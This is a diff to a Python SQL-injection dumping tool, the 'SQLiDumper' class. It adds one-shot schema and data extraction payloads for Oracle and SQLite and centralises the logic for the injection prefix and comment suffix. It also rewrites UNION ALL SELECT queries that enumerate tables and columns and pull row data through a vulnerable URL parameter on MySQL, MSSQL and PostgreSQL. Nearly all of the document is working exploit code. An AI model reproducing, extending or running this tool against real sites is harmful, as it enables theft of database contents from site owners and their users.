@@ -154,6 +154,25 @@ class SQLiDumper:
             "FROM information_schema.columns "
             "WHERE table_catalog=current_database()),chr(10))"
         ),
+        # Oracle DIOS — uses DBMS_XMLGEN to dump schema in one shot
+        "oracle": (
+            "DBMS_XMLGEN.GETXML("
+            "'SELECT table_name||chr(58)||chr(58)||column_name AS c "
+            "FROM all_tab_columns WHERE owner=SYS_CONTEXT(''USERENV'',''CURRENT_SCHEMA'')')"
+        ),
+        "oracle_data": (
+            "DBMS_XMLGEN.GETXML("
+            "'SELECT {columns} FROM {table} WHERE ROWNUM<={limit}')"
+        ),
+        # SQLite DIOS — dumps all tables + columns from sqlite_master
+        "sqlite": (
+            "GROUP_CONCAT(tbl_name||CHAR(58)||CHAR(58)||sql,CHAR(60)||CHAR(98)||CHAR(114)||CHAR(62)) "
+            "FROM sqlite_master WHERE type='table'"
+        ),
+        "sqlite_data": (
+            "GROUP_CONCAT({columns},CHAR(60)||CHAR(98)||CHAR(114)||CHAR(62)) "
+            "FROM {table} LIMIT {limit}"
+        ),
     }
 
     def __init__(self, scanner: SQLiScanner = None, output_dir: str = None,
@@ -250,6 +269,38 @@ class SQLiDumper:
         
         return categorized
 
+    def _determine_prefix_suffix(self, sqli: SQLiResult, original_value: str) -> tuple:
+        """Determine injection prefix and suffix from SQLiResult.
+        
+        Uses the scanner-detected prefix/suffix fields when available,
+        falls back to heuristic detection for backward compatibility.
+        
+        Returns:
+            (prefix, suffix) tuple ready for UNION injection.
+            prefix includes 'AND 1=2' to suppress original rows.
+        """
+        suffix = getattr(sqli, 'suffix', '-- -') or '-- -'
+        scanner_prefix = getattr(sqli, 'prefix', None)
+        
+        if scanner_prefix:
+            # Use scanner-detected prefix directly
+            is_numeric_style = scanner_prefix in ("-1", "999999.9") or scanner_prefix.endswith(")")
+            if is_numeric_style:
+                return (f"{scanner_prefix} AND 1=2 ", suffix)
+            else:
+                return (f"{scanner_prefix} AND 1=2 ", suffix)
+        
+        # Legacy fallback: infer from original param value / payload_used
+        prefix = "' AND 1=2 "
+        if original_value.lstrip('-').isdigit():
+            prefix = " AND 1=2 "
+        elif sqli.payload_used:
+            p = sqli.payload_used.strip()
+            if not p.startswith("'") and not p.startswith('"'):
+                prefix = " AND 1=2 "
+        
+        return (prefix, suffix)
+
     async def enumerate_tables(self, sqli: SQLiResult, 
                                session: aiohttp.ClientSession) -> List[str]:
         """Enumerate database tables through SQL injection.
@@ -269,16 +320,8 @@ class SQLiDumper:
         base, params = scanner._parse_url(base_url)
         original = params[param][0] if isinstance(params[param], list) else params[param]
         
-        # Determine injection prefix: numeric vs string
-        # Use "AND 1=2" to suppress original rows so UNION data is displayed
-        prefix = "' AND 1=2 "  # Default: string injection
-        if original.lstrip('-').isdigit():
-            prefix = " AND 1=2 "  # Numeric — no quote needed
-        elif sqli.payload_used:
-            # Use scanner's detected payload to determine prefix
-            p = sqli.payload_used.strip()
-            if not p.startswith("'") and not p.startswith('"'):
-                prefix = " AND 1=2 "
+        # Determine injection prefix/suffix using scanner-detected values
+        prefix, suffix = self._determine_prefix_suffix(sqli, original)
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -304,7 +347,7 @@ class SQLiDumper:
                             f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                             f"FROM information_schema.tables "
                             f"WHERE table_schema=database() "
-                            f"LIMIT {offset},20-- -"
+                            f"LIMIT {offset},20{suffix}"
                         )
                         
                         test_params = params.copy()
@@ -331,7 +374,7 @@ class SQLiDumper:
                     null_list_copy[col_idx] = "name"
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
-                        f"FROM sysobjects WHERE xtype='U'-- -"
+                        f"FROM sysobjects WHERE xtype='U'{suffix}"
                     )
                     test_params = params.copy()
                     test_params[param] = [f"{original}{query}"]
@@ -351,7 +394,7 @@ class SQLiDumper:
                     null_list_copy[col_idx] = "tablename"
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
-                        f"FROM pg_tables WHERE schemaname='public'-- -"
+                        f"FROM pg_tables WHERE schemaname='public'{suffix}"
                     )
                     test_params = params.copy()
                     test_params[param] = [f"{original}{query}"]
@@ -387,14 +430,8 @@ class SQLiDumper:
         base, params = scanner._parse_url(sqli.url)
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
         
-        # Determine injection prefix — AND 1=2 suppresses original rows
-        prefix = "' AND 1=2 "
-        if original.lstrip('-').isdigit():
-            prefix = " AND 1=2 "
-        elif sqli.payload_used:
-            p = sqli.payload_used.strip()
-            if not p.startswith("'") and not p.startswith('"'):
-                prefix = " AND 1=2 "
+        # Determine injection prefix/suffix using scanner-detected values
+        prefix, suffix = self._determine_prefix_suffix(sqli, original)
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -416,7 +453,7 @@ class SQLiDumper:
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                         f"FROM information_schema.columns "
-                        f"WHERE table_schema=database() AND table_name='{table}'-- -"
+                        f"WHERE table_schema=database() AND table_name='{table}'{suffix}"
                     )
                     
                     test_params = params.copy()
@@ -438,7 +475,7 @@ class SQLiDumper:
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                         f"FROM information_schema.columns "
-                        f"WHERE table_name='{table}'-- -"
+                        f"WHERE table_name='{table}'{suffix}"
                     )
                     test_params = params.copy()
                     test_params[sqli.parameter] = [f"{original}{query}"]
@@ -459,7 +496,7 @@ class SQLiDumper:
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                         f"FROM information_schema.columns "
-                        f"WHERE table_name='{table}'-- -"
+                        f"WHERE table_name='{table}'{suffix}"
                     )
                     test_params = params.copy()
                     test_params[sqli.parameter] = [f"{original}{query}"]
@@ -504,14 +541,8 @@ class SQLiDumper:
         
         null_list = ["NULL"] * sqli.column_count
         
-        # Determine injection prefix — AND 1=2 suppresses original rows
-        prefix = "' AND 1=2 "
-        if original.lstrip('-').isdigit():
-            prefix = " AND 1=2 "
-        elif sqli.payload_used:
-            p = sqli.payload_used.strip()
-            if not p.startswith("'") and not p.startswith('"'):
-                prefix = " AND 1=2 "
+        # Determine injection prefix/suffix using scanner-detected values
+        prefix, suffix = self._determine_prefix_suffix(sqli, original)
         
         # Build CONCAT expression for all target columns
         separator = "0x7c7c"  # ||
@@ -537,7 +568,7 @@ class SQLiDumper:
                 
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
-                        f"FROM {table} LIMIT {offset},20-- -"
+                        f"FROM {table} LIMIT {offset},20{suffix}"
                     )
                     
                     test_params = params.copy()
@@ -580,7 +611,7 @@ class SQLiDumper:
                     f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
                 )
                 
-                query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
+                query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
                 test_params = params.copy()
                 test_params[sqli.parameter] = [f"{original}{query}"]
                 test_url = scanner._build_url(base, test_params)
@@ -620,14 +651,8 @@ class SQLiDumper:
         
         null_list = ["NULL"] * sqli.column_count
         
-        # Determine injection prefix — AND 1=2 suppresses original rows
-        prefix = "' AND 1=2 "
-        if original.lstrip('-').isdigit():
-            prefix = " AND 1=2 "
-        elif sqli.payload_used:
-            p = sqli.payload_used.strip()
-            if not p.startswith("'") and not p.startswith('"'):
-                prefix = " AND 1=2 "
+        # Determine injection prefix/suffix using scanner-detected values
+        prefix, suffix = self._determine_prefix_suffix(sqli, original)
         
         dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
         if not dios_query:
@@ -642,7 +667,7 @@ class SQLiDumper:
             null_list_copy = null_list.copy()
             null_list_copy[col_idx] = f"CONCAT(0x{marker_start_hex},{dios_query},0x{marker_end_hex})"
             
-            query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
+            query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
             test_params = params.copy()
             test_params[sqli.parameter] = [f"{original}{query}"]
             test_url = scanner._build_url(base, test_params)
